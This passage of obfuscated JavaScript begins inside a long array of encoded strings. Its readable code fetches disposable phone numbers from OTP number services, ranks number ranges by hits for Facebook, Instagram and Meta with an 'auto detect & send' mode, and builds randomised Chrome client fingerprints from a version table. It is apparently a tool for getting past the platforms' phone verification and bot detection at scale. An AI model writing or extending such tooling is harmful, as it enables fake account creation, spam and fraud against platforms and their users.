'iK5VDd9bx0jYyw5KiJT2psi5osi', 'q01cENC', 'Aw50zxj2ywXnCW', 'Cvret2C', 'u2f2zsb0AgLZigTLEsbMB3iGzNv0DxjLihvZzt8', 'u0vmrunuifbst1Hzie1preu', 'wwvZlcbZyxzLigL0', 'ihn1ChbVCNrLzcbIEsbcyw5KywKP', 'EMvVtfa', 'zxHPC3rZu3LUyW', 'AM9PBG', 'wc1szwfSluLq', 'mJeZmJe1ue5Hte55', 'rw50zxiGBNvTyMvYig9Mie9uuhmGCgvYigvTywLSicGWigzVCIb1BMXPBwL0zwqSig9YicDIywnRjYK6', 'yxv0AenVzgu', 'ywjVDxq6yMXHBMS', 'xsbtDhjLyw1PBMCG', 'iokuGIa', 'iK5VDcLbpujYyw5KiJT2psi5osi', '4PYtifrHCMDLDcaGoIa', 'qKforefjlvyXlJaUmcaGicaGicaGicaGicaGica', 'zgrKwLy', 'yxbPlM1HAwWUy3G', '4QYf77IpieDViejHy2SGDg8GqvbjieTLEq', 'ANv1qKK', '8j+tGsbfBNrLCIbqCM94AwvZiezPBguGugf0Aa', 'DMTQBvO', 'EfDuuLa', 'y3D4qMW', 'suyGuKvkrunuruqSifjfvfjzifDjveGGrLjfu0GGu0vtu0LptJ8', 'CMv0DxjU', 'cIaGrw50zxiGC2vSzwn0Aw9UicHLlMCUideSmYb8ideGmIa1ihWGms0ZkqO', 'BePxD2i', 'BwrUshi', 'u2vJluzLDgnOlurLC3q', 'vgHVBwfZ', 'r3bKyNe', 'u0LKr2q', '4Psu4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4PsycG', 'cIaGqxbWoIa', 'C2v0vgLTzw91Da', 'Ahr0Ca', 'icbB', 'lI4Ukq', 'DM9SDhHFA2v5lNr4Da', 'iKDVB2DSzsbdAhjVBwuIo3y9iG', 'v2rmvwq', 'iLDPBMrVD3mI', 'u0vtu0LptG', 'BwfPBc50BtOGy3jLyxrLigzHAwXLzcaO', 'icaGg1SZm20', 'ywn0Aw9U', 'B1fuvve', 'tMv4yu9uudOGtM8GBNvTyMvYihjLDhvYBMvK', 'rw50zxiGuhjVEgLLCYbgAwXLifbHDgGGkg9YicDIywnRjYK6', 'DxnL', 'AwnnsxK', '8j+uGsbzzxmSihjLDhj5ideGDgLTzsb3AxrOigzYzxnOihnLC3nPB24GkerLzMf1BhqP', 'Dc5Tzs9Zy3jHCgvYx2TPBMCGicaGicaGicaGica', 'u2vZC2LVBIbLCNjVCIbVBIa', 'BwTKAxjtEw5J', 'iK5VDdTbkujYyw5KiJT2psiYnci', 'Ahr0Chm6lY9WlwjHBMrHAs5JB20VyxbPl2fKzhjLC3mVy291BNrYEu51BwjLCG', 'uMf0zsbSAw1PDgvKigj5ig1HAwWUy3GSigjHy2TPBMCGB2zMidHZ', 'ChjVEhK', 'qMnkz1K', 'A29Jv3m', 'rgvSzxrLihnHDMvKigTLEq', 'DgjRuxO', 'tMzSuge', 'icaGicaGicaGicaGicaGicaGicaGica', 'rgzWwgW', 'qMLzr0y', 'AxzPB1i', 'v1nrBue', 'B3vdrKC', '4OYO77Ipien1C3rVBsbszxrYEsbdB3vUDc4UlG', 'vertCvO', 'lM5LEgfFyxbPx2TLEq', 'sgXqA0C', 'C29JA3m0', 'qxPZB2W', 'AhrTBf9IB2r5', 'Dg9Rzw4', 'v2LSBgLHBxm', 'zeTZsvu', 'D3jPDgvgAwXLu3LUyW', '4PQHifPLBMv4', 'u2vJluzLDgnOlu1Vzgu', 'Derhz20', 'swzruuS', 'BwfW', '8j+tUeLhka', 'rerPrKG', 'q2HHCMXLCW', 'l19Fx19Fl1XFxYXFl18Vic9Fl1XFxYXFl1XFxYXFl18Vic9Fl18VxY8GFf8Vxf9Flf8VxY8Gl18Vic9Fl1XFx18Vxf9Fx18Vicak', 'y2fSBa', 'vurNEMG', 'CeTvwKW', 'swDksKm', 'svfsv3C', 'Cgfcuxu', 'C3vJy2vZC2z1Bc50Ehq', 'iK5VDdTbpujYyw5KiJT2psiYnci', 'uevQDKm', 'u2vZC2LVBIbLCNjVCG', 'mM9VotOGsw52ywXPzcbku09o', 'ufnluM8', 'Ahr0Chm6lY9WlwjHBMrHAs5JB20', 'sMX0wLm', 'rMfPBgvKig9Uia', 'BwLU', 'iK5VDcLbo0jYyw5KiJT2psi5osi', 'Dw5ZDxbWB3j0zwrszwfZB24', 'iZu1ntu1nq', 'zw5XDwv1zq', 'iYbszxnWB25Zzq', 't1rqifnLBNq', 'BMv4yq', 'BM9YBwfS', 'sefLAeu', 'ihWGugHVBMuGywXYzwfKEsbYzwDPC3rLCMvKcG', 'zuncqvO', 'rM9YD2fYzgvK', 'Ehrus0u', 'rvDYDeq', '8j+tMcbgywnLyM9VAW', 'iIWG', 'vwzfzgC', 'ChjLDMLLD190zxH0', 'C2vYDMLJzq', 'i0zgnKiZnq', 'icHLlMCUidi2mtm0wfHyksbVCIaNyMfJAYC6', 'C21ZyM93zxjFA2v5lNr4Da', 'BM9Uzq', 'y3vZDg9T', 'B3rWq291BNq', 'igzYB20G', 'CND6vMu', 'sw5ZDwzMAwnPzw50igjHBgfUy2u', 'thjewxi', 'B3rWC1bLCKvTywLS', 'CMvKAxi', 'tMv4yu9uua', 'yxbPlM1HAwWUDg0', 'Dgv4Dc9WBgfPBG', 'r2fYy2LH', 'A1HOrNK', 'Dt0XlcbP', 't1rqihrPBwvVDxqGkdmGBwLUkq', 'DMLlCNK', 'Dgv4Df9IB2r5', 'iZaWqZLbnW', 'yvjLr1O', '4PQHief1Dg8GzMv0y2GGzNjVBsbAzw5LEa', 'ndaZ', 'zgvZDhjVEq', 'Bwj4BLC', 'ywnYDuW', 'lIbbzgqGyw5VDgHLCJ8', 'rw50zxiGu01tiejVD2vYiefqssblzxK6', 'r0zeAMK', 'Bwz1wKG', 'uNjPwwq', 'teLrr3K', 'tMv4yu9uudOGvgLTzw91Da', 'Dgrnufa', 'qw1HBMrH', 'CxvLDwu', 'AvvMBeG', 'q29UBMvJDgLVBG', '8j+uPsbbDxrVigzLDgnOigzYB20Gu3rLEcaOmM9VosK', 'uNDVrMC', 'iokgUYbty3jHCgvYieTPBMC', 'ugj3sNa', 'tLD0zKe', 'reLsrunu', 'DhDVt29dB25MAwC', 'y2Hvyq', 'rMfPBgvK', 'BMfTzq', 'zMfJzwjVB2S', 'BgvltLK', 'l3n0B3jHz2uVzw11Bgf0zwqVmc9ty3jHCgvYieTPBMCVyMfUzgfP', 'Ahr0ChmTChjVEhKTywDLBNq', 'zMjJBeW', 'vM9SDhGG4PQH', 'whzWrM8', 'iK5VDd1bx0jYyw5KiJT2psi5osi', 'ihnLBNqPiokaLcbZD2L0y2HPBMCGDg8Gyw5VDgHLCIbTywLSlI4U', 'DfrXA2m', 'icaGicaBwZKWBq', 'qNH2yMW', 'vwT5Dg4', 'ig51BwjLCNmP', 'twf4ihbYAwnLihbLCIbUDw1IzxiGw2rLzMf1Bhq6idaUnv06', 'jMnVDw50CNK9', 'rw50zxiGtMv4yu9uucbbueKGs2v5icH0ExbLicDIywnRjYb0BYbNBYbIywnRktO', 'CgXHDgzVCM0', 'DgHLBG', 'l3jLz2LZDgvY', 'tufwDeC', 'uw50rKe', 'iK5VDd1bp0jYyw5KiJT2psi4iG', 'z2v0', 'iIWGiKnOCM9TAxvTiJT2psi', 'cIaGwW', 'wxnRu3K', 'CgHVBMvoBW', 'CgfKu3rHCNq', 'l2fWAs92ms9UDw1IzxjZl3aZl2DLDa', 'rw1PBhK', 'z3jHEq', 'zgf0yq', 'iokgKIa', 'rhHnzgO', '8j+tSsbbDxrVigzLDgnOigzYB20Gu01tiejVD2vY', '4PscifVIGkjDifrLBgvNCMfTica6ia', 'C3rLEf9RzxKUDhH0', 'x3nPzf8', '4PscifVIGkjDifrHCMDLDcaGica6ia', 'wMvUzxG6ig5Vig51BwjLCG', 'A2Xnz2K', 's0Xsr1C', 'wwvZlcb1C2uGC2f2zwqGA2v5', 'Dt0WlcbP', 'tvPVC0y', 'Au9ky2W', 'Cgf0Aa', 'iK5VDcLbpujYyw5KiJT2psi4iG', 'D3jPDgu', 'rMjMqMO', 'qwnJzxb0', 's1DYvfa', 'qLPeyK0', 'Dg9tDhjPBMC', 'DMfSDwvZ', 'qMrHAua', 's3LKsgm', 'DxrMoa', 'Aw5JBhvKzxm', '4Psm4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psq', 'wZqVnf0GvMfSAwrHDgLUzYbLBwfPBcbpvfaUlI4', 'zw1HAwXZ', 'Ag9ZDg5HBwu', 'qM9VDhn0CMfWoIbivfrqia', 'l01yuZq3rKXgwdbvl3rUzxzZl0bWDwjSAwmVyxbPl2nVBNnVBgu', 'icaGlYbFxYaPx19FxYbFx19FxYaGx19FxY8Gl19FxYbFx19FxYHFksaVihWGlYaVx19Fif9Fx19Fif9FxYaGx19Fx19Fx19Fica', 'AKjrDMS', 'Aw5OzxjPDa', 'rhjXzvC', 'C2XPy2u', 'y29UC3rYDwn0B3i', 'q29UC29SzsbMzxrJAcbMywLSzwq', 'sK52ANC', 'A2PXt3C', 'mueH', 'Bg9N', 'BwPxD08', 'uxzqwfe', 'y2fWDhvYzq', 'BNnKyxe', 'Ahr0Chm', 'rK9sqKLerevo', 'EM9treC', 'zgvSzxrL', 'vwrPD3i', 'Eun0ANO', 'cIaG4PYxie5VihzHBgLKihjHBMDLCY4k', 'ig51BwjLCNmGka', 'yxbWBhK', 'mJm0', 'BNbTigLUC3rHBgWGAhr0ChmTChjVEhKTywDLBNqGC29JA3mTChjVEhKTywDLBNqGy2HHBgTancbJAgvLCMLV', 'z2jitwS', 'icaJicaGuMfUz2uGicaGicaGicaGicaGieHPDhmGiefWChm', 'q2HLy2TPBMCGCgHVBMuGka', 'Bwf0y2G', 'iK5VDcHbo0jYyw5KiJT2psi4iG', 'sKnPAhG', 'ndi5', 'l3jLz2LZDgvYl21LBwjLCNjLz2LZDhjHDgLVBG', 'otq2otHOrwvPt3m', 'wZeVnf0Gq3jLyxrPBMCGAw5IB3GUlI4', '4PM+77IpicbvBMXPBwL0zwqGkeTLzxaGC2vUzgLUzYb1BNrPBcbcyw5KywKGCMvQzwn0CYaVigXPBwL0CYK', 'wMvUzxGGA2v5igzVDw5KicG', 'vLvAD2C', 'yxbPlJjVBZKUy2XVDwq', 'Ahr0CdOVlW', 'AxnFBMf0Aw9UywW', 'sMvZC2LJyq', 'y2HLzxjPBW', 'Dg9mB3DLCKnHC2u', 'AufcAem', 'DMfSDwu', 'DgvZDa', 'otC0', 'sLvYDM4', 'ihjHBMDLkhmPlIbbzgqGyw5VDgHLCJ8', 'D1HHqKK', 'jMfJDgLVBJ1NzxroDw1IzxiMC2vYDMLJzt0', 'rgvZA3rVCa', 'C3rLEa', 'DNnhEwe', 'CvrvwfK', 'zuDoELO', 'A2v5CW', 'CgfZCW', 'tNPqBuS', 'u2f2zsbRzxK/', 'C2v0', 'tM8SihbYB2nLzwqGDg8GBMv4DcbZDgvW', 'C1ntChm', 'AhbMrKC', 'Cgf0Ag5HBwu', '4P2miev4AxqGuhjVz3jHBq', 'y3jLyxrLzef0', 'z2DLCG', 'rhzyC0G', 'u21PDgG', 'BMv4yunVBMzPzW', 'lIbtD2L0y2HPBMCGDg8Gyw5VDgHLCIbTywLSicG', 'ihWGsfDjrdOGvMvYAwzPzwq', 'yxjNDG', 'BwfPBc5JEdOGBM8Gzg9TywLUCW', 'qwnJzxb0luXHBMD1ywDL', 'Afjqzg8', 'q3LPDxC', 'icHLlMCUidiXnJi0ndG1wfHyksbVCIb0ExbLicDIywnRjZO', 'igXVywrLzcbMCM9TignVDw50CNKGDgfIBguGka', 'l3yXl2DLDg51Bq', 'CgXHDfzLCG', 'rw50zxiGCMfUz2uGiW', 'D2HPDgu', 'l3yXl2nVBMzPzW', 'qxv0Ag9YAxPHDgLVBG', 'zw1HAwWTC3vIAMvJDa', 'wwz2tgm', 'uhbMruq', 'r3b1tLq', 'CvLmvfK', 'icdILzRILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILz0k', 'z3jLzw4', 'iK5VDcbbkejYyw5KiJT2psi5osi', 'CwP5D20', 'EwvSBg93', 'sMv4sNK', 'iK5VDc9bkujYyw5KiJT2psiYnci', 'uw5NA2q', 'rw50zxiG', 'veX6wwy', 'yM9Sza', 'C3vWCg9YDgvK', 'CgXHDa', 'y3rYBa', 'BuLMBuu', 'zNnmzxC', 'AgL0CW', 'g1SYsHTBm0OBw0G', 'wMvUzxG6igLUDMfSAwqGsLnptG', '8j+tIIbtAg93ihrVCca1icyGC2vSzwn0', 'sM9ZzxbO', 'rLryzgO', 'vg90ywWGvgLTzq', 'Cg1svNa', 'y2f0y2G', 'Agjyz0K', 'C2LUz2XLtNvTyMvY', 'u3PLwM8', 'yNvPBgrnAw4', 'CM91BMq', 'Bwv0yvTUyw1LpsjJC3jMlxrVA2vUiL0', 'BMv3', 'ENniDKm', 'nda4mZm1vuDMtwng', 'vxnMseO', 'l2fWAs9WAg9Uzu5V', 'sg93ihrVihnLBgvJDcbYyw5Nzxm/', 'BwfPBc50Bsb0Aw1LB3v0', 'Bwf4', 'twLJAgfLBa', 'CMvWBgfJzq', 'wxzXswO', 'sw52ywXPzcbYzxf1zxn0ic8Gvw5ZDxbWB3j0zwqGBNvTyMvY', 'DvjnChO', 'qundrvntx05vtujfuJO', 'y29YCW', 'Dvnfseu', 'odaXnvLZzMPiCW', 'u01tiejVD2vYigTLEsbMB3vUzcaO', 'Ewrhtfe', 'yM9KEq', 'sM9OBG', '4OYO77Ipien1C3rVBs4UlG', 'cIaG4PYxie5VihzHBgLKihnLBgvJDgLVBI4k', 'CMvWzwf0', 's0DREvi', 'zfDXCeu', 'vxnLCI1bz2vUDa', 'u0vmrunuie5fweeGu0vsvKvs', 'svrAtfK', 'sMHzAwK', '4PYp77IpicbfBNrLCIbTyw51ywXSEq', 'Cgf1C2u', 'AgfZ', 'cIaGw+kAOsbAzw5LEf0Gu3rYzwfTAw5Nia', 'v29YA2vYia', 'B2zure4', 'yNzXA0u', 'wK1TthK', 'mYbpvfbZihbLCIbfBwfPBcaOrgvMyxvSDcK', 'uMLJAgfYza', 'y29UDgvUDa', 'sw52ywXPzcbUDw1Izxi', 'Axnby3rPDMu', 'DKz1sxO', 'wMvUzxGGDgLTzw91Da', 'zgvIDq', 'B2jQzwn0', 'ChjVy2vZC2vK', 'icdILAdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILAm', 'y2HHAw4', 'cIaGw1jHBMDLiezPBMrLCL0GrMv0y2HPBMCGBgL2zsbJB25ZB2XLigzLzwqUlI4', 'rhj2v2y', 'yK5LqMq', 'cIaG4PYtifnLBgvJDgvKoIa', 'xsdINjCGtM8GBNvTyMvYCYbMzxrJAgvKlIbmyxn0igvYCM9YoIa', 'u3nAsu8', 'y3vRDKm', 'BKzfyu4', 'A3HJuMO', 'vvj3Bfm', 'mM9VotOGtM8GBNvTyMvY', 'qxr2wfG', 'yuX0veO', 't2nhCeK', 'icdILiiGia', 'wNv4te8', 'DLrMA1a', 'iokCPIbty3jHCgvYieTPBMC', 'zNjVBq', 'ywjnvxu', 'CvjrCNO', 'C3rKAw8', 'qLDds24', 'B3rW', 'C3LZDgvTx2rVBwfPBNm', 'qMj6Dei', 'oty2', 'DwHdBee', 't3jPz2LU', 'z3PPCa', 'mc41', 'mtaWifrOCMvHzhmGkev4DhjLBwuP', 'vNLYvxi', 'ELDKA08', 'xsdINjCGsw5ZDwzMAwnPzw50igjHBgfUy2uG4OcuigfIB3j0Aw5NlGO', 'swjSque', 'vw5PDgvKifn0yxrLCW', 'wfvxzeG', 'txzxEgy', 'uLzptMe', 'Aw5WDxq', 'Dgv4Da', 'CMfUzg9T', 'ufPYBvy', 'CwfWwum', 'qwnJzxb0luvUy29KAw5N', 'CKf5ufe', 'ywjZB3jI', 'q29UDgvUDc1uExbL', 'Dvj5q0m', 'zw50CMLLCW', 'z2XHBgG', 'zM9YBwf0', 'y3j5ChrV', 'AxnbCNjHEq', 'Ec1Nms1HCMvHlwnVzgu', 'yNDMz2S', 'AhbhwKC', 'y0jJu1O', 'sfHeExy', 'xcTCkYaQkd86w2eTEKeTwL8KxvSWltLHlxPblvPFjf0Qkq', 'uhjLBwL1BsbmAwnLBNnLicaGicaGicaGicaGica', 'cIaG4PYxiezPBguGBM90igzVDw5KoIa', 'zw1HAwWTyM9KEq', 'mJu0', '4OYO77Ipien1C3rVBsboDw1IzxiUlI4', 'zhnUBum', 'y29UC29SzvbHDgG', 'tMv4yu9uudOGsw52ywXPzcbYzxnWB25Zzq', 'wc1gB3j3yxjKzwqTrM9Y', 't2fsuK8', 'C3vIC3rYAw5N', 'BNvTyMvYC0zPBgu', 'vhjPz2DLCMvKie9uucbMB3iG', 'u2vZC2LVBIbLCNjVCIbMB3iG'];
  fn1 = function () {
    return v74;
  };
  return fn1();
}
function twoOoFetchNumber(v75, v76, v77) {
  return new Promise((v78, v79) => {
    const v80 = stripRid(v76),
      v81 = {};
    v81.rid = v80;
    const v82 = JSON.stringify(v81);
    const v83 = {
        'hostname': "api.2oo9.cloud",
        'port': 0x1bb,
        'path': v77,
        'method': "POST",
        'headers': {
          'mauthapi': v75,
          'Content-Type': "application/json",
          'Content-Length': Buffer.byteLength(v82)
        }
      },
      v84 = https.request(v83, v85 => {
        let v86 = '';
        v85.on("data", v87 => v86 += v87), v85.on("end", () => {
          try {
            const v88 = JSON.parse(v86);
            if (v88?.["meta"]?.["code"] === 0xc8 && v88?.["data"]?.["no_plus_number"]) v78(v88.data.no_plus_number);else v79(new Error(v88?.["message"] || v88?.["meta"]?.["status"] || "2oo9: No number"));
          } catch (v89) {
            v79(new Error("2oo9: Invalid JSON"));
          }
        });
      });
    v84.on("error", v90 => v79(new Error("2oo9 network: " + v90.message)));
    v84.setTimeout(0x2710, () => {
      v84.destroy(), v79(new Error("2oo9: Timeout"));
    });
    v84.write(v82);
    v84.end();
  });
}
function twoOoFetchConsole(v91, v92) {
  return new Promise((v93, v94) => {
    const v95 = {};
    v95.mauthapi = v91;
    const v96 = {};
    v96.hostname = "api.2oo9.cloud";
    v96.port = 0x1bb, v96.path = v92, v96.method = "GET";
    v96.headers = v95;
    const v97 = v96,
      v98 = https.request(v97, v99 => {
        let v100 = '';
        v99.on("data", v101 => v100 += v101);
        v99.on("end", () => {
          try {
            const v102 = JSON.parse(v100);
            if (v102?.["meta"]?.["code"] === 0xc8 && Array.isArray(v102?.["data"]?.["hits"])) v93(v102.data.hits);else v94(new Error(v102?.["message"] || "Console fetch failed"));
          } catch (v103) {
            v94(new Error("Console: Invalid JSON"));
          }
        });
      });
    v98.on("error", v104 => v94(new Error("Console network: " + v104.message))), v98.setTimeout(0x2710, () => {
      v98.destroy(), v94(new Error("Console timeout"));
    }), v98.end();
  });
}
function parseTwoOoRangeSelection(v105, v106) {
  const v107 = new Set(),
    v108 = v105.split(/[\s,]+/).filter(v109 => v109);
  for (const v110 of v108) {
    const v111 = v110.match(/^(\d+)-(\d+)$/);
    if (v111) for (let v112 = +v111[0x1]; v112 <= +v111[0x2]; v112++) {
      if (v112 >= 0x1 && v112 <= v106) v107.add(v112 - 0x1);
    } else {
      const v113 = parseInt(v110);
      if (!isNaN(v113) && v113 >= 0x1 && v113 <= v106) v107.add(v113 - 0x1);
    }
  }
  return [...v107].sort((v114, v115) => v114 - v115);
}
async function autoRangeFinderFor2Oo(v116, v117, v118, v119) {
  const v120 = {};
  v120.facebook = ["facebook", 'fb'], v120.instagram = ["instagram", 'ig'], v120.meta = ["meta"], v120.all = ["facebook", 'fb', "instagram", 'ig', "meta", "bandai"];
  const v121 = v120;
  const v122 = {};
  v122.facebook = "📘 Facebook", v122.instagram = "📸 Instagram", v122.meta = "🌐 Meta", v122.all = "📦 All";
  const v123 = v122;
  console.log(chalk.gray("\n  [Range Finder] Fetching live console feed..."));
  let v124 = [];
  try {
    v124 = await twoOoFetchConsole(v116, v117);
  } catch (v138) {
    return console.log(chalk.red("\n  ✗ Console fetch failed: " + v138.message + '\x0a')), null;
  }
  const v125 = v124.slice(0x0, 0x64);
  if (v125.length === 0x0) return console.log(chalk.red("\n  ✗ No hits in console feed.\n")), null;
  const v126 = {};
  v126.name = "📘 Facebook", v126.value = "facebook";
  const v127 = {};
  v127.name = "📸 Instagram";
  v127.value = "instagram";
  const v128 = {};
  v128.name = "🌐 Meta", v128.value = "meta";
  const v129 = {};
  v129.name = "📦 All";
  v129.value = "all";
  const v130 = await v118("Filter by app:", [v126, v127, v128, v129]),
    v131 = v121[v130],
    v132 = v125.filter(v139 => {
      const v140 = (v139.sid || '').toLowerCase(),
        v141 = (v139.message || '').toLowerCase();
      return v131.some(v142 => v140.includes(v142) || v141.includes(v142));
    });
  if (v132.length === 0x0) return console.log(chalk.red("\n  ✗ No hits for selected app.\n")), null;
  const v133 = {},
    v134 = {};
  for (const v143 of v132) {
    const v144 = v143.range || '';
    if (!v144) continue;
    v133[v144] = (v133[v144] || 0x0) + 0x1;
    const v145 = {};
    v145.facebook = 0x0, v145.instagram = 0x0, v145.meta = 0x0, v134[v144] = v134[v144] || v145;
    if (v121.facebook.some(v146 => (v143.sid || '').toLowerCase().includes(v146) || (v143.message || '').toLowerCase().includes(v146))) v134[v144].facebook++;
    if (v121.instagram.some(v147 => (v143.sid || '').toLowerCase().includes(v147) || (v143.message || '').toLowerCase().includes(v147))) v134[v144].instagram++;
    if (v121.meta.some(v148 => (v143.sid || '').toLowerCase().includes(v148) || (v143.message || '').toLowerCase().includes(v148))) v134[v144].meta++;
  }
  const v135 = Object.entries(v133).sort((v149, v150) => v150[0x1] - v149[0x1]).slice(0x0, 0x5);
  if (v135.length === 0x0) return console.log(chalk.red("\n  ✗ No valid ranges.\n")), null;
  const v136 = {};
  v136.name = "📊 Show top 5 & select";
  v136.value = "select";
  const v137 = await v118("Range Finder mode:", [{
    'name': "⚡ Auto detect & send (#1 range)",
    'value': "auto"
  }, v136]);
  if (v137 === "auto") {
    const [v151, v152] = v135[0x0],
      v153 = v134[v151] || {},
      v154 = [];
    if (v153.facebook) v154.push("📘FB(" + v153.facebook + ')');
    if (v153.instagram) v154.push("📸IG(" + v153.instagram + ')');
    if (v153.meta) v154.push("🌐Meta(" + v153.meta + ')');
    return console.log(chalk.green("\n  ✓ Auto Range: " + v151 + "  (" + v152 + " hits)  " + v154.join('\x20') + '\x0a')), [v151];
  } else {
    console.log(chalk.cyan("\n  App: " + v123[v130] + "  |  Scanned: " + v132.length + " hits\n")), console.log(chalk.yellow("  #   Range              Hits  Apps")), console.log(chalk.gray("  ─".repeat(0x16))), v135.forEach(([v158, v159], v160) => {
      const v161 = v134[v158] || {},
        v162 = [];
      if (v161.facebook) v162.push("📘FB(" + v161.facebook + ')');
      if (v161.instagram) v162.push("📸IG(" + v161.instagram + ')');
      if (v161.meta) v162.push("🌐Meta(" + v161.meta + ')');
      console.log(chalk.cyan('\x20\x20' + String(v160 + 0x1).padEnd(0x3) + '\x20') + chalk.green(v158.padEnd(0x10)) + chalk.yellow(String(v159).padEnd(0x5)) + chalk.gray('█'.repeat(Math.min(v159, 0xc)) + '\x20\x20') + (v162.join('\x20') || chalk.gray('?')));
    }), console.log(chalk.gray("\n  Enter selection (e.g. 1,3 | 1 2 5 | 1-3)\n"));
    const v155 = await v119("Select ranges:", ''),
      v156 = parseTwoOoRangeSelection(v155, v135.length);
    if (v156.length === 0x0) return console.log(chalk.red("\n  ✗ No valid selection.\n")), null;
    const v157 = v156.map(v163 => v135[v163][0x0]);
    return console.log(chalk.green("\n  ✓ Selected: " + v157.join(',\x20') + '\x0a')), v157;
  }
}
function nexaFetchNumber(v164, v165, v166) {
  return new Promise((v167, v168) => {
    const v169 = {};
    v169.range = v165, v169.format = "normal";
    const v170 = JSON.stringify(v169),
      v171 = {
        'hostname': "nexaotpservice.com",
        'port': 0x50,
        'path': v166 || "/api/v1/numbers/get",
        'method': "POST",
        'headers': {
          'X-API-Key': v164,
          'Content-Type': "application/json",
          'Content-Length': Buffer.byteLength(v170)
        }
      };
    const v172 = http.request(v171, v173 => {
      let v174 = '';
      v173.on("data", v175 => v174 += v175);
      v173.on("end", () => {
        try {
          const v176 = JSON.parse(v174);
          v176.success && v176.number ? v167(v176.number.replace(/[^0-9]/g, '')) : v168(new Error(v176.error || "NexaOTP: No number returned"));
        } catch (v177) {
          v168(new Error("NexaOTP: Invalid response"));
        }
      });
    });
    v172.on("error", v178 => v168(new Error("NexaOTP network: " + v178.message)));
    v172.setTimeout(0x2710, () => {
      v172.destroy();
      v168(new Error("NexaOTP: Timeout"));
    }), v172.write(v170), v172.end();
  });
}
const v1 = {};
v1.v = 0x7e, v1.buildMin = 0x194e, v1.buildMax = 0x1984, v1.grease = "\"Not/A)Brand\";v=\"8\"";
const v2 = {};
v2.v = 0x7f, v2.buildMin = 0x1985, v2.buildMax = 0x19d4, v2.grease = "\"Not)A;Brand\";v=\"99\"";
const v3 = {};
v3.v = 0x80, v3.buildMin = 0x19d5, v3.buildMax = 0x1a0b, v3.grease = "\"Not;A=Brand\";v=\"8\"";
const v4 = {};
v4.v = 0x81, v4.buildMin = 0x1a0c, v4.buildMax = 0x1a42, v4.grease = "\"Not=A?Brand\";v=\"8\"";
const v5 = {};
v5.v = 0x82, v5.buildMin = 0x1a43, v5.buildMax = 0x1a79, v5.grease = "\"Not?A_Brand\";v=\"99\"";
const v6 = {};
v6.v = 0x83, v6.buildMin = 0x1a7a, v6.buildMax = 0x1ab1, v6.grease = "\"Not_A Brand\";v=\"24\"";
const v7 = {};
v7.v = 0x84, v7.buildMin = 0x1ab2, v7.buildMax = 0x1b1e, v7.grease = "\"Not A(Brand\";v=\"8\"";
const v8 = {};
v8.v = 0x85, v8.buildMin = 0x1b1f, v8.buildMax = 0x1b55, v8.grease = "\"Not(A;Brand\";v=\"99\"";
const v9 = {};
v9.v = 0x86, v9.buildMin = 0x1b56, v9.buildMax = 0x1b88, v9.grease = "\"Not;A)Brand\";v=\"24\"";
const v10 = {};
v10.v = 0x87, v10.buildMin = 0x1b89, v10.buildMax = 0x1bbe, v10.grease = "\"Not)A=Brand\";v=\"8\"";
const v11 = {};
v11.v = 0x88, v11.buildMin = 0x1bbf, v11.buildMax = 0x1bee, v11.grease = "\"Not=A_Brand\";v=\"99\"";
const v12 = {};
v12.v = 0x89, v12.buildMin = 0x1bef, v12.buildMax = 0x1c23, v12.grease = "\"Not/A)Brand\";v=\"8\"";
const v13 = {};
v13.v = 0x8a, v13.buildMin = 0x1c24, v13.buildMax = 0x1c59, v13.grease = "\"Not)A;Brand\";v=\"99\"";
const v14 = {};
v14.v = 0x8b, v14.buildMin = 0x1c5a, v14.buildMax = 0x1c7d;
v14.grease = "\"Not;A=Brand\";v=\"24\"";
const v15 = {};
v15.v = 0x8c, v15.buildMin = 0x1c7e, v15.buildMax = 0x1c9f, v15.grease = "\"Not=A?Brand\";v=\"8\"";
const v16 = {};
v16.v = 0x8d, v16.buildMin = 0x1ca0, v16.buildMax = 0x1cbe, v16.grease = "\"Not?A_Brand\";v=\"24\"";
const v17 = {};
v17.v = 0x8e, v17.buildMin = 0x1cbf, v17.buildMax = 0x1ce2, v17.grease = "\"Not_A Brand\";v=\"8\"";
const v18 = {};
v18.v = 0x8f, v18.buildMin = 0x1ce3, v18.buildMax = 0x1cf6, v18.grease = "\"Not A(Brand\";v=\"99\"";
const v19 = {};
v19.v = 0x90, v19.buildMin = 0x1cf7, v19.buildMax = 0x1cfd, v19.grease = "\"Not(A;Brand\";v=\"8\"";
const v20 = {};
v20.v = 0x91, v20.buildMin = 0x1cfe, v20.buildMax = 0x1d03, v20.grease = "\"Not;A)Brand\";v=\"24\"";
const v21 = {};
v21.v = 0x92, v21.buildMin = 0x1d04, v21.buildMax = 0x1d1b, v21.grease = "\"Not)A=Brand\";v=\"99\"";
const v22 = {};
v22.v = 0x93, v22.buildMin = 0x1d1c, v22.buildMax = 0x1d35, v22.grease = "\"Not=A_Brand\";v=\"8\"";
const v23 = {};
v23.v = 0x94, v23.buildMin = 0x1d36, v23.buildMax = 0x1d49, v23.grease = "\"Not/A)Brand\";v=\"24\"";
const v24 = {};
v24.v = 0x95, v24.buildMin = 0x1d4a, v24.buildMax = 0x1d7d, v24.grease = "\"Not)A;Brand\";v=\"24\"";
const CHROME_VERSIONS = [v1, v2, v3, v4, v5, v6, v7, v8, v9, v10, v11, v12, v13, v14, v15, v16, v17, v18, v19, v20, v21, v22, v23, v24];
function getRandomClient() {
  const v179 = CHROME_VERSIONS,
    v180 = Math.random() < 0.6,
    v181 = v180 ? v179.slice(0xa) : v179;
